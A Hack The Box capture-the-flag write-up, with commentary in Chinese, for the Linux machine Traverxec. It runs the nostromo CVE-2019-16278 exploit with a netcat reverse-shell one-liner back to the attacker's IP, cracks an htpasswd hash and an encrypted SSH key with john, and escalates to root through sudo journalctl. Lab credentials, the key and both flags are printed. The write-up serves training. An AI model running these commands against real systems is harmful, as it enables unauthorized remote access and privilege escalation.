###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Traverxec
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.27.9 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.27.9:22
Open 10.129.27.9:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDVWo6eEhBKO19Owd6sVIAFVCJjQqSL4g16oI/DoFwUo+ubJyyIeTRagQNE91YdCrENXF2qBs2yFj2fqfRZy9iqGB09VOZt6i8oalpbmFwkBDtCdHoIAZbaZFKAl+m1UBell2v0xUhAy37Wl9BjoUU3EQBVF5QJNQqvb/mSqHsi5TAJcMtCpWKA4So3pwZcTatSu5x/RYdKzzo9fWSS6hjO4/hdJ4BM6eyKQxa29vl/ea1PvcHPY5EDTRX5RtraV9HAT7w2zIZH5W6i3BQvMGEckrrvVTZ6Ge3Gjx00ORLBdoVyqQeXQzIJ/vuDuJOH2G6E/AHDsw3n5yFNMKeCvNNL
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLpsS/IDFr0gxOgk9GkAT0G4vhnRdtvoL8iem2q8yoRCatUIib1nkp5ViHvLEgL6e3AnzUJGFLI3TFz+CInilq4=
|   256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJ16OMR0bxc/4SAEl1yiyEUxC3i/dFH7ftnCU7+P+3s
80/tcp open  http    syn-ack nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods: 
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

google找到[CVE-2019-16278](https://github.com/aN0mad/CVE-2019-16278-Nostromo_1.9.6-RCE)，開nc
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

┌──(kali㉿kali)-[~/htb/CVE-2019-16278-Nostromo_1.9.6-RCE]
└─$ python CVE-2019-16278.py -t 10.129.27.9 -p 80 -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.54 4444 >/tmp/f"

$ python3 -c 'import pty; pty.spawn("/bin/bash")'

www-data@traverxec:/usr/bin$ 
```

用`linpeas.sh`
```
www-data@traverxec:/tmp$ wget 10.10.14.22/linpeas.sh
www-data@traverxec:/tmp$ chmod +x linpeas.sh
www-data@traverxec:/tmp$ ./linpeas.sh

╔══════════╣ Analyzing Htpasswd Files (limit 70)
-rw-r--r-- 1 root bin 41 Oct 25  2019 /var/nostromo/conf/.htpasswd                                                                          
david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

用john破破
```
┌──(kali㉿kali)-[~/htb]
└─$ john david --format=md5crypt-long --wordlist=/home/kali/rockyou.txt      
Nowonly4me       (?)
```

持續在`/var/nostromo/`裡面找東西，找到`/var/nostromo/conf/nhttpd.conf`
```
www-data@traverxec:/usr/local$ cat /var/nostromo/conf/nhttpd.conf
cat /var/nostromo/conf/nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

雖然`/home/david`的資料夾不能存取，但提到有`homedirs_public`，嘗試用`ls`看看，可以看到!有一個`protected-file-area`
```
www-data@traverxec:/var/nostromo/conf$ ls /home/david/public_www

index.html  protected-file-area
```

再繼續列出，有一個`backup-ssh-identity-files.tgz`的檔案
```
www-data@traverxec:/var/nostromo/conf$ ls /home/david/public_www/protected-file-area

backup-ssh-identity-files.tgz
```

把它複製過來`/tmp`，解壓縮
```
www-data@traverxec:/var/nostromo/conf$ cp /home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz /tmp

www-data@traverxec:/tmp$ tar zxvf backup-ssh-identity-files.tgz
tar zxvf backup-ssh-identity-files.tgz
home/david/.ssh/
home/david/.ssh/authorized_keys
home/david/.ssh/id_rsa
home/david/.ssh/id_rsa.pub
```

裡面有`david`的`ssh key`
```
www-data@traverxec:/tmp/home/david/.ssh$ ls -al
ls -al
total 20
drwx------ 2 www-data www-data 4096 Oct 25  2019 .
drwxr-xr-x 3 www-data www-data 4096 Sep 19 03:31 ..
-rw-r--r-- 1 www-data www-data  397 Oct 25  2019 authorized_keys
-rw------- 1 www-data www-data 1766 Oct 25  2019 id_rsa
-rw-r--r-- 1 www-data www-data  397 Oct 25  2019 id_rsa.pub

www-data@traverxec:/tmp/home/david/.ssh$ cat id_rsa
cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,477EEFFBA56F9D283D349033D5D08C4F

seyeH/feG19TlUaMdvHZK/2qfy8pwwdr9sg75x4hPpJJ8YauhWorCN4LPJV+wfCG
tuiBPfZy+ZPklLkOneIggoruLkVGW4k4651pwekZnjsT8IMM3jndLNSRkjxCTX3W
KzW9VFPujSQZnHM9Jho6J8O8LTzl+s6GjPpFxjo2Ar2nPwjofdQejPBeO7kXwDFU
RJUpcsAtpHAbXaJI9LFyX8IhQ8frTOOLuBMmuSEwhz9KVjw2kiLBLyKS+sUT9/V7
HHVHW47Y/EVFgrEXKu0OP8rFtYULQ+7k7nfb7fHIgKJ/6QYZe69r0AXEOtv44zIc
Y1OMGryQp5CVztcCHLyS/9GsRB0d0TtlqY2LXk+1nuYPyyZJhyngE7bP9jsp+hec
dTRqVqTnP7zI8GyKTV+KNgA0m7UWQNS+JgqvSQ9YDjZIwFlA8jxJP9HsuWWXT0ZN
6pmYZc/rNkCEl2l/oJbaJB3jP/1GWzo/q5JXA6jjyrd9xZDN5bX2E2gzdcCPd5qO
xwzna6js2kMdCxIRNVErnvSGBIBS0s/OnXpHnJTjMrkqgrPWCeLAf0xEPTgktqi1
Q2IMJqhW9LkUs48s+z72eAhl8naEfgn+fbQm5MMZ/x6BCuxSNWAFqnuj4RALjdn6
i27gesRkxxnSMZ5DmQXMrrIBuuLJ6gHgjruaCpdh5HuEHEfUFqnbJobJA3Nev54T
fzeAtR8rVJHlCuo5jmu6hitqGsjyHFJ/hSFYtbO5CmZR0hMWl1zVQ3CbNhjeIwFA
bzgSzzJdKYbGD9tyfK3z3RckVhgVDgEMFRB5HqC+yHDyRb+U5ka3LclgT1rO+2so
uDi6fXyvABX+e4E4lwJZoBtHk/NqMvDTeb9tdNOkVbTdFc2kWtz98VF9yoN82u8I
Ak/KOnp7lzHnR07dvdD61RzHkm37rvTYrUexaHJ458dHT36rfUxafe81v6l6RM8s
9CBrEp+LKAA2JrK5P20BrqFuPfWXvFtROLYepG9eHNFeN4uMsuT/55lbfn5S41/U
rGw0txYInVmeLR0RJO37b3/haSIrycak8LZzFSPUNuwqFcbxR8QJFqqLxhaMztua
4mOqrAeGFPP8DSgY3TCloRM0Hi/MzHPUIctxHV2RbYO/6TDHfz+Z26ntXPzuAgRU
/8Gzgw56EyHDaTgNtqYadXruYJ1iNDyArEAu+KvVZhYlYjhSLFfo2yRdOuGBm9AX
JPNeaxw0DX8UwGbAQyU0k49ePBFeEgQh9NEcYegCoHluaqpafxYx2c5MpY1nRg8+
XBzbLF9pcMxZiAWrs4bWUqAodXfEU6FZv7dsatTa9lwH04aj/5qxEbJuwuAuW5Lh
hORAZvbHuIxCzneqqRjS4tNRm0kF9uI5WkfK1eLMO3gXtVffO6vDD3mcTNL1pQuf
SP0GqvQ1diBixPMx+YkiimRggUwcGnd3lRBBQ2MNwWt59Rri3Z4Ai0pfb1K7TvOM
j1aQ4bQmVX8uBoqbPvW0/oQjkbCvfR4Xv6Q+cba/FnGNZxhHR8jcH80VaNS469tt
VeYniFU/TGnRKDYLQH2x0ni1tBf0wKOLERY0CbGDcquzRoWjAmTN/PV2VbEKKD/w
-----END RSA PRIVATE KEY-----
```

把它存起來之後用john破
```
┌──(kali㉿kali)-[~/htb]
└─$ ssh2john id_rsa > david_hash
              
┌──(kali㉿kali)-[~/htb]
└─$ john david_hash --wordlist=/home/kali/rockyou.txt

hunter           (id_rsa) 
```

用ssh登入`david`的帳號，就可以在`/home/david`得到user.txt
```
┌──(kali㉿kali)-[~/htb]
└─$ chmod 600 id_rsa

┌──(kali㉿kali)-[~/htb]
└─$ ssh -i id_rsa david@10.129.209.92

Enter passphrase for key 'id_rsa': hunter

david@traverxec:~$ cat user.txt
48f969c210bb206528bd81ce0ad7a075
```

查看`david`裡面有一個`bin`資料夾，裡面有`server-stats.sh`
```
david@traverxec:~/bin$ ls
server-stats.head  server-stats.sh
```

裡面有提到直接用`sudo`執行`journalctl`
```bash
david@traverxec:~/bin$ cat server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

查看[GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/#sudo)，可得root後可在/root裡得root.txt
```
david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service

!/bin/sh
# python3 -c 'import pty; pty.spawn("/bin/bash")'

root@traverxec:~# cat root.txt
23894f0a8826fbefcfcd3b9e019fbbf8
```
